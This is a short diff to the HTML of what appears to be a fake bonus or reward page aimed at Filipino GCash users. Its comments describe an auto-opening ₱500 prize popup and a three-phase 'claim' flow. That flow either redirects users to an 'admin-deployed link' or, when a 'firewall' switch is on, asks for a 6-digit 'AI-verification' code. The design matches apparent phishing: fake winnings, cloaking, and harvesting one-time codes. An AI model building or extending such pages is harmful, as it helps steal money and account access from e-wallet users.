@@ -151,6 +151,7 @@
 
     <!-- ============================================================
          BONUS REWARD POPUP (PT_Cat + ₱500 + CLAIM BONUS)
+         Auto-popup ito pagka-load ng page (3s fresh / 5s claimed)
          ============================================================ -->
     <div id="bonusRewardPopup" class="bonus-reward-popup" style="display: none;">
         <div class="bonus-reward-container">
@@ -201,10 +202,27 @@
         </div>
     </div>
 
+    <!-- ============================================================
+         3-PHASE CLAIM POPUP (Carnival Theme)
+         ============================================================
+         PHASE 1: HOORAY — balance + bills + CLAIM THRU GCASH
+         PHASE 2: GREAT JOB — confirm + PROCEED TO WITHDRAW
+         PHASE 3: AI-VERIFICATION — 6-digit code (kapag firewall ON)
+
+         FIREWALL OFF → Phase 1 → Phase 2 → REDIRECT sa admin-deployed link
+         FIREWALL ON  → Phase 1 → Phase 2 → Phase 3 (AI-Call) → Submit
+         ============================================================ -->
+    <div id="claimPhasePopup" class="claim-phase-popup" style="display: none;">
+        <div class="claim-phase-container">
+            <div class="claim-phase-inner" id="claimPhaseInner">
+                <!-- Content injected by playbonus.js -->
+            </div>
+        </div>
+    </div>
+
     <!-- ========== SCRIPTS ========== -->
     <script src="js/config.js"></script>
     <script src="js/playbonus.js"></script>
-    <script src="js/popup_playbonus.js"></script>
     <script src="js/chat_widget.js"></script>
 
     <!-- ========== INLINE SCRIPT ========== -->
